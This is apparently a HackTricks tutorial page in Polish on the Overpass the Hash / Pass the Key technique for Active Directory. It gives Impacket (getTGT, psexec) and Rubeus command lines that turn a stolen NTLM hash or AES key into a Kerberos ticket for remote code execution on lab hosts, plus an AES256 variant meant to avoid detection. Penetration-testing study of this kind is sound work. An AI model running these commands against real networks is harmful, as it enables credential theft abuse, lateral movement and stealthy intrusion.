# Over Pass the Hash/Pass the Key

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Overpass The Hash/Pass The Key (PTK)

Atak **Overpass The Hash/Pass The Key (PTK)** jest przeznaczony dla środowisk, w których tradycyjny protokół NTLM jest ograniczony, a uwierzytelnianie Kerberos ma pierwszeństwo. Ten atak wykorzystuje skróty NTLM lub klucze AES użytkownika do uzyskania biletów Kerberos, umożliwiając nieautoryzowany dostęp do zasobów w sieci.

Aby przeprowadzić ten atak, pierwszym krokiem jest zdobycie skrótu NTLM lub hasła konta docelowego użytkownika. Po uzyskaniu tych informacji można uzyskać Bilet Grantujący Bilet (TGT) dla tego konta, umożliwiając atakującemu dostęp do usług lub maszyn, do których użytkownik ma uprawnienia.

Proces można rozpocząć za pomocą następujących poleceń:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
W przypadku scenariuszy wymagających AES256 można użyć opcji `-aesKey [klucz AES]`. Ponadto, uzyskany bilet może być wykorzystany z różnymi narzędziami, takimi jak smbexec.py lub wmiexec.py, poszerzając zakres ataku.

Napotkane problemy, takie jak _PyAsn1Error_ lub _KDC cannot find the name_, zazwyczaj można rozwiązać, aktualizując bibliotekę Impacket lub używając nazwy hosta zamiast adresu IP, zapewniając zgodność z Kerberos KDC.

Alternatywna sekwencja poleceń przy użyciu Rubeus.exe demonstruje inną stronę tej techniki:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ta metoda odzwierciedla podejście **Pass the Key**, skupiając się na przejęciu i wykorzystaniu biletu bezpośrednio do celów uwierzytelniania. Ważne jest zauważenie, że inicjacja żądania TGT wywołuje zdarzenie `4768: Żądano biletu uwierzytelniania Kerberos (TGT)`, co oznacza domyślne użycie RC4-HMAC, chociaż nowoczesne systemy Windows preferują AES256.

Aby dostosować się do bezpieczeństwa operacyjnego i używać AES256, można zastosować następujące polecenie:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Odwołania

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
